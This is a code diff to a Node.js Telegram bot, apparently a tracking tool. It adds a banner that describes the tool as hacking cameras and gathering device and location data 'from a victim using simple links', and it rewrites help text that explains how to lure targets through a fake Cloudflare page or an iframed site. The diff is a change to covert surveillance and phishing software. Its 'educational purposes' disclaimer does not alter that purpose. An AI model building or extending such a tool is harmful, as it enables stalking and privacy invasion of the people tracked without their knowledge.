@@ -24,6 +24,39 @@ var hostURL = "YOUR_URL"; // Ganti dengan URL yang sesuai
 // TOGGLE for Shorters
 var use1pt = false;
 
+// Log ASCII art and description in the terminal
+console.log("\x1b[32m%s\x1b[0m", `
+
+                                                                                                
+                                                                                                 
+  ██████╗░░█████╗░██████╗░░█████╗░███╗░░██╗  ██╗███╗░░██╗░██████╗██╗░██████╗░██╗░░██╗████████╗  
+  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗░██║  ██║████╗░██║██╔════╝██║██╔════╝░██║░░██║╚══██╔══╝   
+  ██████╔╝██║░░██║██████╦╝███████║██╔██╗██║  ██║██╔██╗██║╚█████╗░██║██║░░██╗░███████║░░░██║░░░ 
+  ██╔══██╗██║░░██║██╔══██╗██╔══██║██║╚████║  ██║██║╚████║░╚═══██╗██║██║░░╚██╗██╔══██║░░░██║░░░ 
+  ██║░░██║╚█████╔╝██████╦╝██║░░██║██║░╚███║  ██║██║░╚███║██████╔╝██║╚██████╔╝██║░░██║░░░██║░░░ 
+  ╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝  ╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░  
+                                                                                                 
+                                Author: Yves Liebert (a.k.a Roban Ins)                           
+                                                                                                  
+                    Description: Tool for tracking, hacking cameras, and gathering               
+                    device and location information from a victim using simple links.            
+                                      
+
+`);
+
+console.log("\x1b[33m%s\x1b[0m", `
+
+   🛠️ TOOL FEATURES                                                      
+                                                                         
+   ➤ Capture victim's device information 📱                             
+   ➤ Gather location data (latitude, longitude, accuracy) 📍          
+   ➤ Exploit camera access to capture photos 📸                          
+                                                                          
+   ⚠️ Disclaimer: This tool is for educational purposes only. Misuse of  
+   this tool is strictly prohibited and may lead to severe legal action. 
+
+`);
+
 app.get("/w/:path/:uri", (req, res) => {
     var ip;
     var d = new Date();
@@ -80,31 +113,18 @@ bot.on('message', async (msg) => {
             reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
         };
 
-        bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can track someone just by providing a link.\nYou will get:\n\📱Information about the victim's devices\n\📍The victim's location\n\ 📸 The victim's photo\nType /help for more info.`, m);
+        bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can track someone just by providing a link.\nType /help for more info.`, m);
     } else if (msg.text == "/create") {
         createNew(chatId);
-    } else if (msg.text == "/help") {
-        // Track People with Ease Using This Bot
-const message = `
+    } else if (msg.text === "/help") {
+        bot.sendMessage(chatId, `
 💻 How it Works:
-Through this bot, you can track people by simply sending a simple link! 👀
+1. Use /create to start.
+2. Provide a URL when prompted.
+3. Get tracking links to gather information.
 
-1. Send /create to start.
-2. After that, you will be asked for a URL which will be used in an iframe to lure your target.
-3. Once the URL is received, the bot will provide 2 links to track people.
+⚠️ Disclaimer: For educational purposes only.`);
 
-Specifications 📋:
-
-1. Cloudflare Link 🌩️:
-   This method shows a Cloudflare Under Attack page to gather information, then redirects the victim to the target URL.
-
-2. Webview Link 🌐:
-   This option displays a website (e.g., Bing, dating sites, etc.) using an iframe to collect information.
-
-🔒 Disclaimer: Use responsibly and ethically. Be mindful of privacy and legal considerations when using such tools.
-`;
-
-bot.sendMessage(chatId, message);
     }
 });
 
